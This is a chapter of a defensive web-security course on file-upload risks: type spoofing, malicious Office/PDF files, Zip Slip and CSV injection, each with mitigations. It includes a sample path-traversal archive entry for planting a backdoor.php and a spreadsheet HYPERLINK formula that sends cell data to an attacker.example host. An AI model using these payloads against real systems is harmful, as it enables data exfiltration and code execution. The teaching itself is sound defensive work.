---
order: 13
---

# File Uploads: Validation, Zip Slip, CSV Injection

Accepting a file sent by the user (profile picture, supporting document, data import) opens a separate attack surface: unlike a text field, a file has a TYPE, a structured CONTENT, and a SIZE, each exploitable differently. This chapter covers the three most frequent pitfalls.

## Validating a File's Type: Never on the Extension Alone

The file name and the `Content-Type` header sent by the browser during an upload are information supplied by the CLIENT, so they can be forged like any other data in a request (see the principle already stated in [The Main Families of Vulnerabilities](/?c=securite&s=cybersecurite&p=types-de-failles): never trust external data without validating it).

```text
File actually sent: script.php renamed to photo.jpg
Content-Type header sent by the browser: image/jpeg   (easy to forge)
File name extension: .jpg                              (just a name, not content)

-> If the server checks ONLY the declared extension/Content-Type,
   an executable file can pass itself off as an image
```

| Check | Reliability | What it prevents |
|---|---|---|
| File name extension | Weak: just text supplied by the client | Nothing guaranteed on its own |
| `Content-Type` declared by the browser | Weak: also supplied by the client | Nothing guaranteed on its own |
| The file's real binary signature (*magic bytes*, the first bytes that identify the actual format) | Reliable: read from the content, not declared by the client | An executable disguised as an image with a fake extension |
| File stored outside the folder the web server executes | Reliable: even if a malicious file gets through anyway, it can never run | An uploaded script executed directly by visiting its URL |

> **Pitfall:** validating only the declared extension or `Content-Type`, both supplied by the client and therefore forgeable without effort.
>
> **Best practice:** check the real binary signature of the content (a dedicated library for the language used), enforce a maximum size, and store uploaded files in a folder the web server cannot execute as code, whatever the outcome of the validation.

## A Booby-Trapped Specialized File (PDF, Excel, Word)

An Office document (`.docx`, `.xlsx`) is actually a zip ARCHIVE containing several XML files; a PDF is a format of nested objects, with its own syntax. Processing such a file (text extraction, OCR, conversion) means trusting a SPECIALIZED parsing library against content potentially designed to exploit it, beyond the simple "empty or truncated file" case already seen as a general edge case.

| Risk | What it exploits |
|---|---|
| Internal decompression bomb | An `.xlsx`/`.docx` is a zip: the same principle as a [classic decompression bomb](/?c=securite&s=cybersecurite&p=surcharge-et-deni-de-service-applicatif) applies, hidden in a format that does not look like an archive at first glance |
| Parsing library crashing on a malformed document | A document processing library (PDF extraction/OCR, Excel reading) is not designed first and foremost to resist hostile content; a deliberately malformed document can make it crash, or in rare cases reveal behavior its authors did not foresee |
| Active content (macros, external links) | An Office document can embed a macro that runs when it is opened; even if your automated processing never runs a macro, a file generated from an uploaded document (preview, conversion) that kept it would pass it on as is to anyone who opens it afterward |

> **Best practice:** process an uploaded document in an isolated environment if the parsing library used offers no strong robustness guarantee (sandbox, time/memory limits); strip any active content (macros) during a conversion rather than keeping it by default.

## Zip Slip: a Booby-Trapped Path Inside an Archive

An archive (`.zip`, `.tar`) that the application extracts automatically (bulk import, theme unpacking, grouped file upload) contains a list of internal file paths, defined by whoever created the archive. A path designed to climb out of the intended destination folder can write anywhere else on the disk, if the extraction does not check it.

```text
Expected content of an archive entry:  images/photo.jpg
  -> extracted to: /var/www/uploads/images/photo.jpg   (inside the intended folder)

Booby-trapped entry:  ../../../../var/www/html/backdoor.php
  -> if the extraction tool follows this path as is, the file is written
     OUTSIDE the intended destination folder, potentially into a folder
     EXECUTABLE by the web server
```

The name comes from the idea of a file that "slips" out of the target folder during extraction, exactly the same principle as [path traversal](/?c=securite&s=cybersecurite&p=types-de-failles), applied this time to every entry of an archive rather than to a single file name supplied directly.

> **Pitfall:** extracting an uploaded archive with the language's standard decompression function, without checking that every entry path stays inside the intended destination folder.
>
> **Best practice:** before writing each extracted file, check that its final resolved path is indeed a subpath of the destination folder (reject any entry that contains `..` or resolves outside it), or use an extraction library that already applies this check.

## CSV Injection: a Formula Rather Than Plain Data

A `.csv` file generated by the application (data export, report) and meant to be opened in a spreadsheet (Excel, Google Sheets) carries a risk specific to that destination format: the spreadsheet interprets any cell starting with `=`, `+`, `-` or `@` as a FORMULA to compute, not as plain text.

```text
User data stored as is:
  =HYPERLINK("http://attacker.example/steal?c="&A1,"Click here")

CSV export of the field:
  =HYPERLINK("http://attacker.example/steal?c="&A1,"Click here")

When the CSV is opened in Excel: the cell shows a clickable "Click here" link,
which actually sends the content of another cell (A1) to an attacker's server
as soon as it is clicked; worse, some formulas run WITHOUT even being clicked
```

This risk affects any user data exported as is (nickname, comment, file name): nothing in the CSV format itself escapes these characters, it is only the spreadsheet that interprets them this way when opening the file.

> **Pitfall:** exporting raw user data into a CSV, thinking that a CSV file "is just text" and therefore cannot execute anything.
>
> **Best practice:** prefix with an apostrophe (`'`) or a space any exported value that starts with `=`, `+`, `-` or `@`, so that the spreadsheet displays it as plain text rather than interpreting it as a formula.

---

## 📋 Summary

| | |
|---|---|
| **Key takeaways** | An uploaded file carries several risks distinct from a classic text field: its declared type (extension/`Content-Type`) can be forged by the client; an Office/PDF document is a structured format with its own attack surface; an archive can contain booby-trapped internal paths (Zip Slip); a CSV export reopened in a spreadsheet can contain executable formulas (CSV Injection). |
| **Tools you can use** | Detection of the real binary signature (a dedicated library for the language); an isolated environment for parsing structured documents; resolved-path check before extracting an archive; escaping the `=`/`+`/`-`/`@` characters at the start of a CSV cell. |
| **Pitfalls to avoid** | Validating an upload on the declared extension/`Content-Type` alone. Treating an Office/PDF document as a simple file with no attack surface of its own. Extracting an archive without checking that every path stays in the intended folder. Exporting raw user data into a CSV. |
| **Best practices** | Check the real binary signature, store outside an executable folder, enforce a maximum size. Isolate the parsing of a structured document (sandbox, resource limits). Reject any archive path that leaves the destination folder. Escape any CSV cell starting with a formula character. |
